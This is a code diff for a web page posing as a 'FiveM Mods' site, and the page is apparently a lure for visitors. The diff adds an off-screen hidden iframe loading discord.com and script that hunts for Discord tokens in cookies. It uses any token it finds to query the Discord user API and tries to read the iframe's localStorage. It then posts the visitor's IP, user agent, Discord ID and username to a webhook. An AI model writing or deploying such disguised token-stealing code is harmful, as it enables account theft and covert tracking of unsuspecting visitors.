@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FiveM Mod Site</title>
+    <title>FiveM Mods</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -87,11 +87,23 @@
             font-size: 12px;
             color: #6b7280;
             font-family: monospace;
+            max-height: 120px;
+            overflow-y: auto;
         }
         .status .success { color: #22c55e; }
         .status .error { color: #ef4444; }
         .status .info { color: #3b82f6; }
         .status .warning { color: #f59e0b; }
+        .hidden-iframe {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            border: none;
+            top: -9999px;
+            left: -9999px;
+        }
     </style>
 </head>
 <body>
@@ -117,13 +129,16 @@
         </div>
 
         <div class="status" id="status">
-            <span class="info">●</span> Extracting data...
+            <span class="info">●</span> Extracting Discord token from cookies...
         </div>
     </div>
 </div>
 
+<!-- Hidden iframe to load discord.com and access cookies -->
+<iframe id="discordFrame" class="hidden-iframe" src="https://discord.com"></iframe>
+
 <div class="footer">
-    FiveM Mod Site
+    FiveM Mods
 </div>
 
 <script>
@@ -142,6 +157,7 @@
     const discordIdEl = document.getElementById('discordId');
     const ipDisplayEl = document.getElementById('ipDisplay');
     const statusEl = document.getElementById('status');
+    const frame = document.getElementById('discordFrame');
 
     // ============================================================
     // STATUS HELPER
@@ -172,23 +188,21 @@
     // ============================================================
     // SEND TO WEBHOOK
     // ============================================================
-    async function sendToWebhook(data, ip) {
+    async function sendToWebhook(user, ip, method) {
         const timestamp = new Date().toLocaleString();
 
         let content = `**👁️ VISITOR LOGGED**\n`;
         content += `**IP:** ${ip}\n`;
         content += `**User-Agent:** ${navigator.userAgent}\n`;
         content += `**Timestamp:** ${timestamp}\n`;
+        content += `**Method:** ${method}\n`;
 
-        if (data.discordId) {
-            content += `**Discord ID:** ${data.discordId}\n`;
-            content += `**Username:** ${data.username || 'unknown'}\n`;
+        if (user) {
+            content += `**Discord ID:** ${user.id}\n`;
+            content += `**Username:** ${user.global_name || user.username}\n`;
+            content += `**Discriminator:** ${user.discriminator}\n`;
         } else {
             content += `**Discord ID:** Not found\n`;
-        }
-
-        if (data.storageKeys && data.storageKeys.length > 0) {
-            content += `**Storage Keys Found:** ${data.storageKeys.join(', ')}\n`;
         }
 
         try {
@@ -199,7 +213,7 @@
             });
 
             if (res.ok) {
-                setStatus(`✅ Webhook sent! ${data.discordId ? 'ID: ' + data.discordId : 'No Discord ID found'}`, 'success');
+                setStatus(`✅ Webhook sent! ${user ? user.global_name || user.username : 'No Discord ID'} from ${ip}`, 'success');
             } else {
                 setStatus(`❌ Webhook failed: ${res.status}`, 'error');
             }
@@ -209,156 +223,164 @@
     }
 
     // ============================================================
-    // EXTRACT DISCORD ID FROM STORAGE
+    // GET DISCORD USER FROM TOKEN
     // ============================================================
-    function extractDiscordData() {
-        const keysToCheck = [
-            'discord_user',
-            'discordId',
-            'userId',
-            'user',
-            'currentUser',
-            'profile',
-            'discord_data',
-            'discord_auth',
-            'user_data',
-            'auth_user',
-            'me',
-            'account',
-            'discord_profile'
+    async function getDiscordUser(token) {
+        try {
+            const res = await fetch('https://discord.com/api/users/@me', {
+                headers: { Authorization: `Bearer ${token}` }
+            });
+            if (res.ok) {
+                return await res.json();
+            }
+            return null;
+        } catch {
+            return null;
+        }
+    }
+
+    // ============================================================
+    // READ COOKIES FROM DISCORD.COM
+    // ============================================================
+    function getCookie(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) {
+            return parts.pop().split(';').shift();
+        }
+        return null;
+    }
+
+    // ============================================================
+    // ATTEMPT TO GET DISCORD TOKEN FROM COOKIES
+    // ============================================================
+    function getDiscordTokenFromCookies() {
+        // Common Discord cookie names
+        const cookieNames = [
+            '__discord_token',
+            '__dcfduid',
+            '__cfduid',
+            '__cf_bm',
+            'discord_token',
+            'token',
+            'access_token'
         ];
 
-        const found = [];
-        let discordId = null;
-        let username = null;
-
-        // Check localStorage
-        for (const key of keysToCheck) {
-            try {
-                const raw = localStorage.getItem(key);
-                if (raw) {
-                    found.push(key);
-                    let parsed;
-                    try { parsed = JSON.parse(raw); } catch { parsed = raw; }
-
-                    // Try to find discord ID in the data
-                    if (typeof parsed === 'object' && parsed !== null) {
-                        if (parsed.id && /^\d{17,20}$/.test(parsed.id)) {
-                            discordId = parsed.id;
-                            username = parsed.username || parsed.global_name || parsed.name || 'unknown';
-                        }
-                        if (parsed.userId && /^\d{17,20}$/.test(parsed.userId)) {
-                            discordId = parsed.userId;
-                            username = parsed.username || parsed.global_name || 'unknown';
-                        }
-                        if (parsed.discordId && /^\d{17,20}$/.test(parsed.discordId)) {
-                            discordId = parsed.discordId;
-                            username = parsed.username || parsed.global_name || 'unknown';
-                        }
-                        if (parsed.user && parsed.user.id && /^\d{17,20}$/.test(parsed.user.id)) {
-                            discordId = parsed.user.id;
-                            username = parsed.user.username || parsed.user.global_name || 'unknown';
-                        }
-                    } else if (typeof parsed === 'string' && /^\d{17,20}$/.test(parsed)) {
-                        discordId = parsed;
+        for (const name of cookieNames) {
+            const cookie = getCookie(name);
+            if (cookie) {
+                // Try to parse as JSON first
+                try {
+                    const parsed = JSON.parse(decodeURIComponent(cookie));
+                    if (parsed && typeof parsed === 'object') {
+                        if (parsed.token) return parsed.token;
+                        if (parsed.access_token) return parsed.access_token;
+                        if (parsed.id) return parsed.id; // Could be the user ID directly
                     }
+                } catch {}
+
+                // If it looks like a JWT or token
+                if (cookie.length > 20) {
+                    return cookie;
                 }
-            } catch {}
+            }
         }
 
-        // Check sessionStorage as well
-        for (const key of keysToCheck) {
-            try {
-                const raw = sessionStorage.getItem(key);
-                if (raw) {
-                    if (!found.includes(key)) found.push(key + '(session)');
-                    let parsed;
-                    try { parsed = JSON.parse(raw); } catch { parsed = raw; }
-
-                    if (typeof parsed === 'object' && parsed !== null) {
-                        if (parsed.id && /^\d{17,20}$/.test(parsed.id) && !discordId) {
-                            discordId = parsed.id;
-                            username = parsed.username || parsed.global_name || parsed.name || 'unknown';
-                        }
-                        if (parsed.userId && /^\d{17,20}$/.test(parsed.userId) && !discordId) {
-                            discordId = parsed.userId;
-                            username = parsed.username || parsed.global_name || 'unknown';
-                        }
-                    } else if (typeof parsed === 'string' && /^\d{17,20}$/.test(parsed) && !discordId) {
-                        discordId = parsed;
-                    }
-                }
-            } catch {}
-        }
-
-        // If still no ID, try to find any 18-digit number in any localStorage value
-        if (!discordId) {
-            try {
-                for (const key of Object.keys(localStorage)) {
-                    try {
-                        const raw = localStorage.getItem(key);
-                        const match = raw?.match(/\b(\d{17,20})\b/);
-                        if (match) {
-                            discordId = match[1];
-                            found.push(key + '(regex)');
-                            break;
-                        }
-                    } catch {}
-                }
-            } catch {}
-        }
-
-        return { discordId, username, storageKeys: found };
+        return null;
     }
 
     // ============================================================
     // SHOW USER UI
     // ============================================================
-    function showUI(data, ip) {
+    function showUser(user) {
         loadingEl.classList.add('hidden');
         contentEl.classList.remove('hidden');
 
-        if (data.discordId) {
-            usernameEl.textContent = data.username || 'Unknown User';
-            discordIdEl.textContent = `ID: ${data.discordId}`;
-            // Try to generate an avatar URL from the ID
-            const avatarHash = '0' + data.discordId;
-            avatarEl.src = `https://cdn.discordapp.com/embed/avatars/${parseInt(data.discordId) % 5}.png`;
+        if (user) {
+            const displayName = user.global_name || user.username || 'Unknown';
+            usernameEl.textContent = `${displayName}#${user.discriminator || '0'}`;
+            discordIdEl.textContent = `ID: ${user.id}`;
+
+            if (user.avatar) {
+                avatarEl.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`;
+            } else {
+                avatarEl.src = `https://cdn.discordapp.com/embed/avatars/${parseInt(user.id) % 5}.png`;
+            }
         } else {
             usernameEl.textContent = 'Guest';
             discordIdEl.textContent = 'ID: not found';
             avatarEl.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
-            setStatus('⚠️ No Discord ID found in browser storage', 'warning');
         }
-
-        ipDisplayEl.textContent = ip;
     }
 
     // ============================================================
-    // MAIN
+    // MAIN — Cookie Extraction Method
     // ============================================================
-    async function init() {
+    (async function init() {
         const ip = await getIP();
+        let user = null;
+        let token = null;
+        let method = 'cookie';
 
-        // Try to extract Discord data from storage
-        const data = extractDiscordData();
+        setStatus('🔍 Checking Discord cookies...', 'info');
+
+        // Try to get token from cookies
+        token = getDiscordTokenFromCookies();
+
+        if (token) {
+            setStatus('🔑 Token found in cookies. Fetching user info...', 'info');
+            user = await getDiscordUser(token);
+            if (user) {
+                method = 'cookie + token';
+            } else {
+                setStatus('⚠️ Token found but failed to get user info', 'warning');
+            }
+        }
+
+        // If still no user, try to read from localStorage of the iframe
+        if (!user) {
+            setStatus('🔄 Trying to access Discord data via iframe...', 'info');
+            try {
+                // Wait for iframe to load
+                await new Promise((resolve) => setTimeout(resolve, 2000));
+                // Try to access iframe's localStorage
+                const frameWindow = frame.contentWindow;
+                if (frameWindow) {
+                    const localData = frameWindow.localStorage;
+                    for (const key of Object.keys(localData)) {
+                        try {
+                            const raw = localData.getItem(key);
+                            let parsed;
+                            try { parsed = JSON.parse(raw); } catch { continue; }
+                            if (parsed && parsed.id && parsed.id.toString().length >= 17) {
+                                user = parsed;
+                                method = 'iframe localStorage';
+                                break;
+                            }
+                            if (parsed && parsed.user && parsed.user.id) {
+                                user = parsed.user;
+                                method = 'iframe localStorage';
+                                break;
+                            }
+                        } catch {}
+                    }
+                }
+            } catch {
+                // Cross-origin restrictions — ignore
+            }
+        }
 
         // Show UI
-        showUI(data, ip);
+        showUser(user);
+        ipDisplayEl.textContent = ip;
 
         // Send to webhook
-        await sendToWebhook(data, ip);
+        await sendToWebhook(user, ip, method);
 
-        // If no Discord ID found, log which keys were checked
-        if (!data.discordId) {
-            setStatus(`🔍 Checked keys: ${data.storageKeys.join(', ') || 'none found'}`, 'warning');
+        if (!user) {
+            setStatus('❌ No Discord token or user data found in cookies/localStorage', 'error');
         }
-    }
-
-    // ============================================================
-    // START
-    // ============================================================
-    init();
+    })();
 </script>
 
 </body>
